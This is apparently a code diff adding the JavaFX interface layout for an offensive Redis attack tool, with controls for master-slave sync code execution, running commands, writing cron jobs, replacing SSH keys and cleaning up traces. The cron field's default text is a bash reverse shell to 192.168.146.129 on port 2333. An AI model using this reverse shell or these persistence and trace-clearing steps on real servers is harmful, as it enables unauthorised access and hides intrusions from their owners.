@@ -1,0 +1,147 @@
+<?xml version="1.0" encoding="UTF-8"?>
+
+<?import javafx.geometry.Insets?>
+<?import javafx.scene.control.Button?>
+<?import javafx.scene.control.ComboBox?>
+<?import javafx.scene.control.Label?>
+<?import javafx.scene.control.Tab?>
+<?import javafx.scene.control.TabPane?>
+<?import javafx.scene.control.TextArea?>
+<?import javafx.scene.control.TextField?>
+<?import javafx.scene.control.TitledPane?>
+<?import javafx.scene.layout.HBox?>
+<?import javafx.scene.layout.VBox?>
+
+<VBox prefHeight="771.0" prefWidth="898.0" xmlns="http://javafx.com/javafx/16" xmlns:fx="http://javafx.com/fxml/1" fx:controller="Controller.RedisController">
+   <children>
+      <TitledPane animated="false" collapsible="false" prefWidth="790.0" text="功能选择">
+         <content>
+            <HBox prefHeight="41.0" prefWidth="788.0" spacing="10.0">
+               <children>
+                  <Button fx:id="redisSlavebtn" mnemonicParsing="false" onAction="#redisSlave" text="主从同步" />
+                  <Button fx:id="redisClearBtn" layoutX="276.0" layoutY="22.0" mnemonicParsing="false" onAction="#redisClear" text="痕迹清理" />
+               </children>
+            </HBox>
+         </content>
+         <VBox.margin>
+            <Insets />
+         </VBox.margin>
+         <padding>
+            <Insets bottom="5.0" />
+         </padding>
+      </TitledPane>
+      <TitledPane animated="false" collapsible="false" prefHeight="78.0" prefWidth="888.0" text="主从设置" VBox.vgrow="ALWAYS">
+         <content>
+            <HBox prefHeight="47.0" prefWidth="886.0" snapToPixel="false" spacing="10.0">
+               <children>
+                  <Label text="服务器地址:">
+                     <HBox.margin>
+                        <Insets top="5.0" />
+                     </HBox.margin>
+                  </Label>
+                  <TextField fx:id="redisVPSAddressTextField" maxWidth="Infinity" prefHeight="27.0" prefWidth="202.0" HBox.hgrow="ALWAYS" />
+                  <Label text="端口:">
+                     <HBox.margin>
+                        <Insets top="5.0" />
+                     </HBox.margin>
+                  </Label>
+                  <TextField fx:id="redisVPSPortTextField" />
+                  <Label text="延时(s):">
+                     <HBox.margin>
+                        <Insets top="5.0" />
+                     </HBox.margin>
+                  </Label>
+                  <TextField fx:id="redisVPSTimeOutTextField" />
+               </children>
+               <padding>
+                  <Insets left="5.0" right="5.0" top="8.0" />
+               </padding>
+            </HBox>
+         </content>
+         <padding>
+            <Insets bottom="5.0" />
+         </padding>
+      </TitledPane>
+      <TabPane prefHeight="452.0" prefWidth="888.0" tabClosingPolicy="UNAVAILABLE">
+        <tabs>
+          <Tab text="命令执行">
+               <content>
+                  <VBox prefHeight="395.0" prefWidth="837.0">
+                     <children>
+                        <HBox prefHeight="47.0" prefWidth="768.0" spacing="10.0">
+                           <children>
+                              <TextField fx:id="redisCommandTextField" maxWidth="Infinity" prefHeight="27.0" prefWidth="654.0" HBox.hgrow="ALWAYS" />
+                              <ComboBox fx:id="redisEncodeCombox" maxWidth="-Infinity" prefHeight="27.0" prefWidth="103.0" promptText="编码" />
+                              <Button fx:id="redisEvalCommandBtn" maxWidth="-Infinity" mnemonicParsing="false" onAction="#redisEvalCommand" prefHeight="27.0" prefWidth="68.0" text="执行" HBox.hgrow="ALWAYS" />
+                           </children>
+                           <padding>
+                              <Insets top="5.0" />
+                           </padding>
+                        </HBox>
+                        <TextArea fx:id="redisOutputTextFArea" maxWidth="Infinity" prefHeight="348.0" prefWidth="839.0" VBox.vgrow="ALWAYS" />
+                     </children>
+                  </VBox>
+               </content>
+          </Tab>
+            <Tab text="扩展功能">
+               <content>
+                  <TabPane prefHeight="200.0" prefWidth="200.0" tabClosingPolicy="UNAVAILABLE">
+                    <tabs>
+                      <Tab text="计划任务">
+                           <content>
+                              <VBox prefHeight="200.0" prefWidth="100.0">
+                                 <children>
+                                    <TextArea fx:id="redisCronTaskInput" prefHeight="345.0" prefWidth="888.0" text="bash -i &gt;&amp; /dev/tcp/192.168.146.129/2333 0&gt;&amp;1">
+                                       <VBox.margin>
+                                          <Insets bottom="5.0" left="5.0" right="5.0" top="5.0" />
+                                       </VBox.margin>
+                                    </TextArea>
+                                    <Button fx:id="redisScheduledTasksBtn" maxWidth="Infinity" mnemonicParsing="false" onAction="#redisScheduledTasks" prefHeight="27.0" prefWidth="882.0" text="开始写入">
+                                       <VBox.margin>
+                                          <Insets bottom="5.0" left="5.0" right="5.0" top="5.0" />
+                                       </VBox.margin>
+                                    </Button>
+                                 </children>
+                              </VBox>
+                           </content>
+                      </Tab>
+                      <Tab text="替换 SSH 公钥">
+                           <content>
+                              <VBox prefHeight="200.0" prefWidth="100.0">
+                                 <children>
+                                    <TextArea fx:id="redisPublicKeyInput" prefHeight="345.0" prefWidth="888.0" text="ssh-keygen -o 获取pub公钥">
+                                       <VBox.margin>
+                                          <Insets bottom="5.0" left="5.0" right="5.0" top="5.0" />
+                                       </VBox.margin>
+                                    </TextArea>
+                                    <Button fx:id="redisReplaceSSHKeyBtn" maxWidth="Infinity" mnemonicParsing="false" onAction="#redisReplaceSSHKey" prefHeight="27.0" prefWidth="890.0" text="开始替换">
+                                       <VBox.margin>
+                                          <Insets bottom="5.0" left="5.0" right="5.0" top="5.0" />
+                                       </VBox.margin>
+                                    </Button>
+                                 </children>
+                              </VBox>
+                           </content>
+                      </Tab>
+                    </tabs>
+                  </TabPane>
+               </content>
+            </Tab>
+        </tabs>
+         <padding>
+            <Insets bottom="5.0" />
+         </padding>
+      </TabPane>
+      <TitledPane animated="false" collapsible="false" maxHeight="Infinity" prefHeight="157.0" prefWidth="839.0" text="日志输出" VBox.vgrow="ALWAYS">
+         <padding>
+            <Insets bottom="5.0" />
+         </padding>
+         <content>
+            <TextArea fx:id="redisLogTextFArea" prefHeight="200.0" prefWidth="200.0" />
+         </content>
+      </TitledPane>
+   </children>
+   <padding>
+      <Insets bottom="5.0" left="5.0" right="5.0" top="5.0" />
+   </padding>
+</VBox>
